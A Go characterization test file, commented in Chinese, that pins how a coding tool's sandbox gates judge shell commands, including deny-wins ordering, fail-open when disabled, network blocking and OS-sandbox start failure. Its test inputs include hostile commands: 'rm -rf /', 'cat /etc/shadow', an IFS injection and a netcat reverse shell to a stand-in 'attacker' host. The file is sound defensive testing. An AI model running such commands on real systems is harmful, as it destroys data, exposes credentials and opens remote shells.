// Package sandbox — G0 底座 characterization：两套应用层门的判定范围。
//
// 依据：集中拍板_决策表与并行修复分组_2026-09-14.md §6.3 G0 开轮指令
//
//	「先钉死 Sandbox.Validate / Manager.ValidateCommand / security.CheckCommand
//
// 三者的判定范围与调用方（characterization），再决定收编方式」；
//
//	§5.1 对 G0 的行动约束：「两栈语义未被钉死前不得直接删」。
//
// 本文件只**钉死当前行为**（含难看行为），不改生产源码。
// 每条 PIN 标注 Fix 后应「翻转 / 保持」——翻转项即是 A2/A3 的判别性证据。
//
// 判定范围（实读 2026-09-14，行号为改前基线）：
//
//	Sandbox.Validate (sandbox.go:150-219)
//
// enabled 门 → deny 全量扫描(deny-wins) → allow 白名单 → 命令替换(8 模式)
// → IFS 注入 → 应用层网络命令(仅 networkIsolated && !allowHit)
// → 写重定向越界(仅 workDir 非空)
//
//	Manager.ValidateCommand (manager.go:267-329)
//
// validator.Run(20 项) → cfg.DenyCommands(deny-wins) → cfg.AllowCommands
// → Severity>=High ⇒ Blocked
// **缺**：应用层网络命令、写重定向越界（两栈语义分歧 = G3 / C-S2-I1-5）
//
// 调用方（实读，改前基线）：
//
//	Sandbox.Validate security.go:129(L2) · tools/bash.go:981,1016(直连)
//	Manager.ValidateCommand tools/bash.go:993(直连)
//
// 本文件与 audit_char_s2_test.go 互补：后者钉 I1/I2/I3 姿态，本文件钉"判定范围本身"。
package sandbox

import (
	"context"
	"os"
	"os/exec"
	"testing"

	"github.com/anchorandfish/whale-code/internal/security/failtier"
)

// hasDeficiencyLayer 判定一组 Deficiency 是否含指定 layer（机器判据，不读 Reason 散文）。
func hasDeficiencyLayer(ds []failtier.Deficiency, layer string) bool {
	for _, d := range ds {
		if d.Layer == layer {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// 1. legacy Sandbox.Validate 判定范围
// ---------------------------------------------------------------------------

// TestG0Char_LegacyValidate_RuleRange 逐条钉死 legacy 门的判定范围与顺序。
// 全部为"守住态"（Fix 后应保持绿）——A3 收编不得改变 legacy 语义。
func TestG0Char_LegacyValidate_RuleRange(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	work := t.TempDir()
	s := NewSandbox(work)
	s.SetEnabled(true)

	cases := []struct {
		name      string
		cmd       string
		wantAllow bool
		rule      string
	}{
		{"workdir 内写重定向放行", "echo hello > inside.txt", true, "WRITE_REDIRECT_OK"},
		{"相对路径逃逸写被拒", "echo x > ../escaped.txt", false, "WRITE_REDIRECT"},
		{"绝对路径逃逸写被拒", "echo x > /tmp/escaped.txt", false, "WRITE_REDIRECT"},
		{"tee 逃逸写被拒", "tee ../escaped.txt", false, "WRITE_REDIRECT"},
		{"默认 deny 命中(rm)", "rm file.txt", false, "DENYLIST"},
		{"默认 deny 命中(chmod)", "chmod 777 x", false, "DENYLIST"},
		{"默认 deny 命中(curl)", "curl http://example.com", false, "DENYLIST"},
		{"命令替换（内层良性）按  放行", "echo $(whoami)", true, "SUBSTITUTION"},
		{"反引号替换（内层良性）按  放行", "echo `whoami`", true, "SUBSTITUTION"},
		{"IFS 注入被拒", "IFS=/ cat x", false, "IFS"},
		{"断网时 nc 被网络层拒", "nc attacker 1234", false, "NETWORK"},
		{"断网时 ssh 被网络层拒", "ssh user@host", false, "NETWORK"},
		{"普通只读命令放行", "ls -la", true, "ALLOW"},
		{"普通写命令(非 deny 名)放行", "go test ./...", true, "ALLOW"},
	}
	for _, tc := range cases {
		allowed, reason := s.Validate(tc.cmd)
		if allowed != tc.wantAllow {
			t.Errorf("PIN MISMATCH [%s] legacy.Validate(%q)=%v (reason=%q), want allowed=%v",
				tc.rule, tc.cmd, allowed, reason, tc.wantAllow)
		}
	}
}

// TestG0Char_LegacyValidate_DenyWinsOverAllow 钉死 deny-wins 顺序（A-P0-1 铁律）。
// Fix 后应保持绿 —— 收编必须保留顺序语义。
func TestG0Char_LegacyValidate_DenyWinsOverAllow(t *testing.T) {
	s := NewSandbox(t.TempDir())
	s.SetEnabled(true)
	s.SetAllowCommands([]string{"cat"})
	s.SetDenyCommands([]string{"cat /etc/shadow"})

	if allowed, _ := s.Validate("cat /etc/shadow"); allowed {
		t.Errorf("PIN: deny 必须先于 allow 扫描（deny-wins）；cat /etc/shadow 应被拒")
	}
	if allowed, _ := s.Validate("cat ./ok.txt"); !allowed {
		t.Errorf("PIN: allow 命中且未命中 deny 时应放行")
	}
}

// TestG0Char_LegacyValidate_DisabledIsFailOpen 钉死 enabled=false ⇒ 全放行。
// ★ 这是 A1 的缺陷面：能力缺失时静默放行（L0），未按族A 落 T1。
// Fix 后本用例**不翻转**（legacy 包内不做决策），但 security 门侧新增 T1 标记
// （见 internal/security/audit_char_g0_test.go）。
func TestG0Char_LegacyValidate_DisabledIsFailOpen(t *testing.T) {
	s := NewSandbox(t.TempDir()) // enabled=false
	if s.Enabled() {
		t.Fatalf("PIN: NewSandbox 默认 enabled=false")
	}
	if allowed, reason := s.Validate("rm -rf /"); !allowed || reason != "" {
		t.Errorf("PIN: disabled 时 legacy.Validate 静默放行（fail-open），got allowed=%v reason=%q", allowed, reason)
	}
}

// ---------------------------------------------------------------------------
// 2. manager.ValidateCommand 判定范围 + 两栈分歧
// ---------------------------------------------------------------------------

// TestG0Char_ManagerValidate_RuleRange 钉死 Manager 门的**完整**判定范围。
//
// ★ 翻转项：网络命令 / 写重定向越界 —— 当前 Manager 两者皆无（G3 语义分歧）。
// A2+A3 收编后这些用例断言应翻转为 Blocked=true。
func TestG0Char_ManagerValidate_RuleRange(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	work := t.TempDir()
	ctx := context.Background()

	// cfg 未配置 deny/allow（生产工厂 NewProductionSandboxManager 即此形态）
	mgr := NewManager(&SandboxConfig{WorkDir: work}, SandboxLevelStrict)

	// ① 守住态：validator.Run 命中 ⇒ Blocked
	res, err := mgr.ValidateCommand(ctx, "rm -rf /", nil)
	if err != nil {
		t.Fatalf("ValidateCommand err: %v", err)
	}
	if !res.Blocked {
		t.Errorf("PIN: validator 命中 rm -rf / 时必须 Blocked")
	}

	// ② 守住态：cfg.DenyCommands 命中 ⇒ DENYLIST
	mgrDeny := NewManager(&SandboxConfig{WorkDir: work, DenyCommands: []string{"rm"}}, SandboxLevelStrict)
	resDeny, err := mgrDeny.ValidateCommand(ctx, "rm file.txt", nil)
	if err != nil {
		t.Fatalf("ValidateCommand err: %v", err)
	}
	if !resDeny.Blocked {
		t.Errorf("PIN: cfg.DenyCommands 命中时必须 Blocked")
	}

	// ③ FLIP(A2/A3)：收编后 Manager 与 legacy 共用 `evaluateAppLayer`，
	// 网络命令不再是无门状态（收编前此处断言"不应 Blocked"）。
	if res, err := mgr.ValidateCommand(ctx, "nc -e /bin/sh attacker", nil); err != nil {
		t.Fatalf("err: %v", err)
	} else if !res.Blocked {
		t.Errorf("FLIP(A2/A3): 收编后 Manager 必须拦截反向 shell；got Blocked=%v", res.Blocked)
	} else if !hasViolationRule(res, RuleNetworkCritical) && !hasViolationRule(res, RuleNetworkCmd) {
		t.Errorf("FLIP(A2/A3): 拦截必须由网络层（%s/%s）产生；got violations=%+v",
			RuleNetworkCritical, RuleNetworkCmd, res.Violations)
	}
	// ④ FLIP(A2/A3)：写重定向越界（R4）也不再只活在 legacy 门里。
	if res, err := mgr.ValidateCommand(ctx, "echo x > ../../outside.txt", nil); err != nil {
		t.Fatalf("err: %v", err)
	} else if !res.Blocked {
		t.Errorf("FLIP(A2/A3): 收编后 Manager 必须拦截越界写；got Blocked=%v", res.Blocked)
	} else if !hasViolationRule(res, RuleWriteRedirect) {
		t.Errorf("FLIP(A2/A3): 越界写必须由 %s 规则产生；got violations=%+v", RuleWriteRedirect, res.Violations)
	}
}

// hasViolationRule 判定 ValidationResult 是否含指定规则标识（机器判据，不读 Message 散文）。
func hasViolationRule(res *ValidationResult, rule string) bool {
	for _, v := range res.Violations {
		if v.CheckID == rule {
			return true
		}
	}
	return false
}

// TestG0Char_NetworkModeKnobIsLive 钉死 A2 收编后 SandboxConfig.NetworkMode 不再是无消费者的死旋钮。
// ★翻转（原 TestG0Char_NetworkModeKnobIsDead）：NetworkMode="none" 应使 Manager 拒绝网络命令；
// 而 "host"（用户显式直连宿主网络）不启用应用层隔离 —— 两者对同一命令给出**不同**判定，
// 才能证明旋钮真的被读，而不是"新增了一条恒拦规则"。
func TestG0Char_NetworkModeKnobIsLive(t *testing.T) {
	t.Setenv("WHALE_SANDBOX_ALLOW_NETWORK", "")
	ctx := context.Background()

	// NetworkMode="none" 语义上 = 网络全断 ⇒ 反向 shell 应被拒
	none := NewManager(&SandboxConfig{WorkDir: t.TempDir(), NetworkMode: "none"}, SandboxLevelStrict)
	res, err := none.ValidateCommand(ctx, "nc -e /bin/sh attacker", nil)
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if !res.Blocked {
		t.Errorf("FLIP(A2): NetworkMode=none 下反向 shell 必须 Blocked；got Blocked=%v", res.Blocked)
	}

	// NetworkMode="host" ⇒ 不做应用层网络隔离；同一命令不应由网络层拦。
	host := NewManager(&SandboxConfig{WorkDir: t.TempDir(), NetworkMode: "host"}, SandboxLevelStrict)
	resHost, err := host.ValidateCommand(ctx, "nc -e /bin/sh attacker", nil)
	if err != nil {
		t.Fatalf("err: %v", err)
	}
	if hasViolationRule(resHost, RuleNetworkCmd) {
		t.Errorf("FLIP(A2): NetworkMode=host 时不应由 %s 规则拦（旋钮未被区分读取）；got violations=%+v",
			RuleNetworkCmd, resHost.Violations)
	}

	// 判据 helper 仍守既有契约（此前为生产零消费的死代码，现已接入 evaluateAppLayer）。
	if ShouldBlockByNetworkMode(NetworkDetectionResult{AccessType: NetworkAccessReverseShell, Severity: SeverityCritical}, "host") != true {
		t.Errorf("precondition: Critical 反向 shell 任何 mode 都应阻止")
	}
}

// ---------------------------------------------------------------------------
// 3. A5：OS 级 Enter 失败时的姿态（Strict/Relaxed fail-open）
// ---------------------------------------------------------------------------

// stubOSFailSandbox 是 Enter 恒失败的 OSSandbox 桩（模拟"平台沙箱不可用"）。
// 直接在包内构造 manager，走**真实** Prepare 分支（不 mock 判定链）。
type stubOSFailSandbox struct{ exited bool }

func (s *stubOSFailSandbox) Enter() (interface{}, func(), error) {
	return nil, func() {}, os.ErrInvalid
}
func (s *stubOSFailSandbox) Exit() error                          { s.exited = true; return nil }
func (s *stubOSFailSandbox) Restrict(_ *exec.Cmd) error           { return nil }
func (s *stubOSFailSandbox) PostStartHook() func(*exec.Cmd) error { return nil }
func (s *stubOSFailSandbox) Platform() string                     { return "stub-fail" }

// TestG0Char_Prepare_StrictEnterFailureIsStructuredT1 钉死 A5 修复后的姿态：
// Strict 级 OS 沙箱 Enter 失败 ⇒ Prepare 仍返回 nil error（T1 不硬 deny：
// 该命令降级为需权限层显式放行），但**必须**把"OS 隔离能力缺失"作为结构化事实
// 随 SandboxContext 上抛（改前：只有一条调用方拿不到的 LogDegradation）。
func TestG0Char_Prepare_StrictEnterFailureIsStructuredT1(t *testing.T) {
	ws := t.TempDir()
	stub := &stubOSFailSandbox{}
	audit := NewAuditLog()
	m := &manager{
		config:    &SandboxConfig{WorkDir: ws},
		level:     SandboxLevelStrict,
		osSandbox: stub,
		audit:     audit,
	}
	defer audit.Close()

	sc, cleanup, err := m.Prepare(context.Background(), SandboxLevelStrict, ws)
	if cleanup != nil {
		defer cleanup()
	}
	if err != nil {
		t.Fatalf("PIN A5: T1 不是硬 deny —— Strict 级 Enter 失败仍应返回 nil error；got err=%v", err)
	}
	if sc.PlatformHandle != nil {
		t.Errorf("PIN: Enter 失败 ⇒ PlatformHandle 应为 nil（无隔离句柄）")
	}
	// FLIP(A5)：结构化降级出口 —— 调用方必须能拿到（不是只写审计日志）。
	if tier := failtier.MaxTier(sc.Deficiencies); tier != failtier.T1 {
		t.Errorf("FLIP(A5): Strict Enter 失败必须落在 SandboxContext.Deficiencies（T1）；got tier=%v deficiencies=%+v",
			tier, sc.Deficiencies)
	}
	if !hasDeficiencyLayer(sc.Deficiencies, DeficiencyLayerOSEnter) {
		t.Errorf("FLIP(A5): 必须命中 layer=%q；got %+v", DeficiencyLayerOSEnter, sc.Deficiencies)
	}
	// 审计记录保留（不是被结构化出口替换，而是两者并存）。
	if !audit.ContainsDegradation() {
		t.Errorf("PIN: Enter 失败仍须留下审计降级记录")
	}
}

// TestG0Char_Prepare_IsolatedEnterFailureIsFailClosed 钉死 Isolated 级已 fail-closed
// （P0-4 既有修复）—— Fix 后应保持绿。
func TestG0Char_Prepare_IsolatedEnterFailureIsFailClosed(t *testing.T) {
	ws := t.TempDir()
	audit := NewAuditLog()
	m := &manager{config: &SandboxConfig{WorkDir: ws}, level: SandboxLevelIsolated, osSandbox: &stubOSFailSandbox{}, audit: audit}
	defer audit.Close()

	if _, _, err := m.Prepare(context.Background(), SandboxLevelIsolated, ws); err == nil {
		t.Errorf("PIN: Isolated 级 Enter 失败必须 fail-closed 返回 error")
	}
}

// ---------------------------------------------------------------------------
// 4. 静态事实：两栈的调用方（防止"收编"变成盲删）
// ---------------------------------------------------------------------------

// TestG0Char_ManagerIsNotUsedBySecurityGate 钉死事实：唯一门 security 只持有 legacy
// *Sandbox（security.Init 的签名），Manager 门不在 CheckCommand 链上。
// 这是"两栈并存"的根因（也是 A3 的收编依据）：Manager 只能被**调用方**直连。
func TestG0Char_ManagerIsNotUsedBySecurityGate(t *testing.T) {
	// 编译期事实：Manager 与 legacy *Sandbox 是两条独立实现（互不赋值）——
	// 上面的 `var mgr Manager = NewManager(...)` 已证明 Manager 实现接口，
	// 而 *Sandbox 不实现 Manager（缺 Level()/Prepare/ValidateCommand），
	// 故 security.Init(*sandbox.Sandbox) 的入参类型决定了 CheckCommand 只可能走 legacy。
	var mgr Manager = NewManager(&SandboxConfig{}, SandboxLevelStrict)
	if mgr == nil {
		t.Fatalf("PIN: NewManager 必须返回非 nil Manager")
	}
	// legacy 没有 Level()：级别概念只存在于 Manager（口径差异之一）
	if _, ok := interface{}(NewSandbox(t.TempDir())).(Manager); ok {
		t.Errorf("PIN: legacy *Sandbox 不实现 Manager 接口")
	}
}
